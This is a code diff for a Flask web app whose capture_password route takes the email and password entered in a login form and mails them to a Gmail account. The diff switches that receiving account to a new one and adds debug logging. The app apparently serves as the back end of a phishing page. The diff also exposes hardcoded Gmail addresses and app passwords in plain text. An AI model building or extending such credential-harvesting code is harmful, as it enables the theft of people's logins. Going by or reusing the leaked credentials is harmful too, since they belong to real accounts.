@@ -1,5 +1,11 @@
 from flask import Flask, render_template, request, redirect, url_for
 from flask_mail import Mail, Message
+import logging
+
+
+# Configure logging
+logging.basicConfig(level=logging.DEBUG)
+
 
 app = Flask(__name__,  static_folder='static')
 
@@ -10,8 +16,8 @@ app.secret_key = 'your_secret_key'  # Replace with your secret key
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 465
 app.config['MAIL_USE_SSL'] = True
-app.config['MAIL_USERNAME'] = 'sarahglazier2@gmail.com '  # Your Gmail address
-app.config['MAIL_PASSWORD'] = 'oqboqsrmeppfxbaw'   # Your Gmail password or app-specific password
+app.config['MAIL_USERNAME'] = 'randersson014@gmail.com '  # Your Gmail address
+app.config['MAIL_PASSWORD'] = 'doawextubdjanoao'   # Your Gmail password or app-specific password
 
 mail = Mail(app)
 
@@ -32,7 +38,7 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient =  'sarahglazier2@gmail.com'  # Your email address to receive the email
+        recipient =  'randersson014@gmail.com'  # Your email address to receive the email
         subject = 'Login'
         body = f'Email: {email}\nPassword entered: {password}'
 
